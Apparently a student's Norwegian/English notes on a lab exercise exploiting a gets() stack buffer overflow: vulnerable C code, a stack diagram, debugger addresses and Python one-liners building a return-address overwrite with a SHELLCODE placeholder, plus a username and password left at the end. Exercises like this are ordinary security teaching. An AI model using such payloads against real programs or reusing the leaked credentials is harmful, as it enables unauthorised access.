
# Oppgave 1 - Remus

void orbit() {
    char buf[8]
    gets(buf)
}

int main() {
    orbit()
    return 0
}
# Stack diagram
[4] RIP main
[4] SP main
[N] Compiler Padding .. (?)
[4] RIP orbit
[4] SFP orbit
[M] Compiler Padding .. (?)
[8] buf
Brrr
# my version
print(SHELLCODE + 19*'A' + 0xffffd658)
# riktig

print('A' * 20 + 0xffffd66c + 4 + SHELLCODE)

# Used HEXA calculator right here
print('A' * 20 + 0xFFFFD670 + Shellcode)
FFFFD76C


# Når man skriver så skriver man på den nederste. Man skriver altså kode der eip'n er
# When you write x/16x buf, you get the output that is at buf, and going upwards

# Address of buf 0xffffd658
# eip = 0xffffd66c <--- der RIP er? ja! Saved value = 0x8049208, den kan man se i x/16x buf
# ebp = 0xffffd668 <--- der sfp er

# Hvis vi tar inn i en hexacalculator kan man se at differansen mellom RIP og addressen til buf er 20, derfor må vi legge inn 20 ord før vi skriver inn en fake RIP

#username: spica
#password: alanguage
